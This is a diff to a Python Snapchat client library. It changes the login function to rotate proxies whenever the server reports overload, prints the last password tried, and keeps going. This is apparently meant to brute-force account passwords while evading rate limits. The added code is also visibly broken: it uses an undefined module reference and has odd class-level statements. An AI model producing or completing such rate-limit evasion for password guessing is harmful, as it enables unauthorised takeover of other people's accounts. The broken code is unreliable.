@@ -2,10 +2,10 @@
 
 import json
 import os.path
-from time import time
+import time
 
 from pysnap.utils import (encrypt, decrypt, decrypt_story,
-                          make_media_id, request)
+                          make_media_id, request, proxy, proxy_refresh)
 
 MEDIA_IMAGE = 0
 MEDIA_VIDEO = 1
@@ -73,19 +73,28 @@ class Snapchat(object):
         ...
 
     """
-    def __init__(self):
+
+# Initialize proxy
+    proxy = utils.proxy_refresh(proxy)
+
+
+# Self
+    def __init__(self, proxy):
         self.username = None
         self.auth_token = None
+        self.proxy = proxy
 
-    def _request(self, endpoint, data=None, files=None,
+# Post Request
+    def _request(self, endpoint, proxies=proxy, data=None, files=None,
                  raise_for_status=True, req_type='post'):
         return request(endpoint, self.auth_token, data, files,
-                       raise_for_status, req_type)
-
+                       raise_for_status, proxies, req_type)
+# [ No Input ] Auth
     def _unset_auth(self):
         self.username = None
         self.auth_token = None
 
+# Login
     def login(self, username, password):
         """Login to Snapchat account
         Returns a dict containing user information on successful login, the
@@ -99,12 +108,20 @@ class Snapchat(object):
             'username': username,
             'password': password
         })
+        result = r.content
         # print(r.content)
         
         
+# Proxy Dead
         if r == "overload":
-            print(f"Server has stopped accepting requests, the last password used was {password}")
-        result = r.content
+            print(f" [ ! | PROXY ] EXPIRED! ROTATING!\n [ ! | PASSWORD] Last attempt: {password}" + "\n")
+            time.sleep(1)
+# Refresh Proxy
+            proxy_refresh(proxy)
+            print(" [ ! | PROXY ] Rotated.")
+            time.sleep(3)
+            pass
+
 		# 	print(f"Run this program again in five minutes, try removing all passwords up to {password}")
         if b'updates_response' in result:
 
